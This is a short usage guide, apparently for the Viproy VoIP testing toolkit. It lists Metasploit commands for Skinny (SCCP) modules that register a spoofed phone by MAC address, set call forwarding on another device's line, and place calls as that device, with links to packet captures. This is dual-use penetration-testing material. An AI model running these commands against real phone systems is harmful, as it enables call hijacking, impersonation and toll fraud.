#Skinny Modules Usage

##Skinny Registration

use auxiliary/voip/viproy_skinny_register <br>
set RHOST 192.168.0.205<br>
set MAC 000C29BF1895<br>
show options<br>
run<br>

set MAC 000C29E58CA3<br>
run<br>

http://www.viproy.com/captures/skinny_register.pcapng<br>

##Skinny Call Forward

use auxiliary/voip/viproy_skinny_callforward <br>
set RHOST 192.168.0.205<br>
set FORWARDTO 1013<br>
set MAC 000C29E58CA3<br>
set ACTION FORWARD<br>
show options <br>
run<br>

http://www.viproy.com/captures/skinny_callforward.pcapng<br>

##Skinny Call

use auxiliary/voip/viproy_skinny_call<br>
set MAC 000C29E58CA3<br>
set TARGET 1013<br>
show options <br>
set RHOST 192.168.0.205<br>
run<br>

http://www.viproy.com/captures/skinny_call.pcapng<br>
